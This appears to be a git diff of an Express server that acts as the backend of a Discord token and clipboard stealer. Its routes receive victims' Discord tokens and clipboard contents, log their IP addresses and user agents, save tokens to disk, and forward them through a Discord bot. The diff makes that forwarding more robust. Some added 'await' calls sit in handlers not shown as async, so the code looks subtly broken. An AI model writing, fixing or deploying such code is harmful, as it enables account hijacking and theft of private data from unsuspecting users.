@@ -7,8 +7,38 @@ const cookieParser = require('cookie-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Import logging functions from your updated bot.js
-const { logDiscordToken, logClipboardData } = require('./bot');
+// Import bot functions with error handling
+let botFunctions = null;
+try {
+  botFunctions = require('./bot');
+} catch (error) {
+  console.warn('⚠️ Bot module not available, Discord logging disabled:', error.message);
+}
+
+// Helper function to safely log to Discord
+async function safeLogToDiscord(data, type) {
+  try {
+    if (!botFunctions) {
+      console.log(`📝 Discord bot not available, skipping ${type} logging`);
+      return;
+    }
+    
+    if (!botFunctions.isReady()) {
+      console.log(`⏳ Discord bot not ready yet, skipping ${type} logging`);
+      return;
+    }
+    
+    if (type === 'token') {
+      await botFunctions.logDiscordToken(data);
+      console.log('✅ Token logged to Discord successfully');
+    } else if (type === 'clipboard') {
+      await botFunctions.logClipboardData(data);
+      console.log('✅ Clipboard data logged to Discord successfully');
+    }
+  } catch (error) {
+    console.error(`❌ Failed to log ${type} to Discord:`, error.message);
+  }
+}
 
 app.use(bodyParser.json());
 app.use(cookieParser());
@@ -138,12 +168,12 @@ app.post('/submit-clipboard', (req, res) => {
     });
     
     // Send to Discord bot using the new channel-based logging
-    logClipboardData({
+    await safeLogToDiscord({
       clipboardData: clipboardData,
       userIP: realIP,
       userAgent: userAgent,
       type: type || 'game'
-    });
+    }, 'clipboard');
     
     console.log(`📋 Clipboard saved for IP ${realIP}: ${filename}`);
     res.send('Clipboard saved.');
@@ -209,12 +239,12 @@ app.get('/receive-token', (req, res) => {
   fs.appendFileSync(mainTokenPath, tokenEntry);
   
   // Send to Discord bot using the new channel-based logging
-  logDiscordToken({
+  await safeLogToDiscord({
     token: token,
     userIP: realIP,
     userAgent: userAgent,
     serverId: serverId || 'N/A'
-  });
+  }, 'token');
   
   console.log(`🔑 Token received from IP ${realIP} - Preview: ${token.slice(0, 20)}...`);
   
@@ -322,12 +352,12 @@ app.post('/receive-token', (req, res) => {
   fs.appendFileSync(mainTokenPath, tokenEntry);
   
   // Send to Discord bot using the new channel-based logging
-  logDiscordToken({
+  await safeLogToDiscord({
     token: token,
     userIP: realIP,
     userAgent: userAgent,
     serverId: serverId || 'N/A'
-  });
+  }, 'token');
   
   console.log(`🔑 Token received via POST from IP ${realIP}`);
   
